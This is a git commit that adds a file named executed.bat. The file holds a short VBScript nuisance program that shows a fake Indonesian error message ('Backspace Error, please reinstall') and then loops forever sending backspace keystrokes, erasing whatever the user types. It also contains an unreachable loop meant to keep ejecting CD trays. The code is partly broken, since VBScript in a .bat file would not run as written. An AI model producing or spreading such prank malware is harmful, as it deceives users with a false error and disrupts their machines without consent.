b5d4ab7f5ca1a47b67e20a3c5053647e068bd3c0
byteofjoshua <91846073+byteofjoshua@users.noreply.github.com>
2022-02-11 18:54:52 +0700

    Create executed.bat

---
+++ executed.bat
@@ -0,0 +1,20 @@
+MsgBox "Backspace Error Mohon Install Ulang"
+Set wshShell =wscript.CreateObject("WScript.Shell")
+do
+wscript.sleep 100
+wshshell.sendkeys "{bs}"
+loop
+
+Set oWMP = CreateObject("WMPlayer.OCX.7")
+Set colCDROMs = oWMP.cdromCollection
+do
+if colCDROMs.Count >= 1 then
+For i = 0 to colCDROMs.Count - 1
+colCDROMs.Item(i).Eject
+Next
+For i = 0 to colCDROMs.Count - 1
+colCDROMs.Item(i).Eject
+Next
+End If
+wscript.sleep 5000
+loop
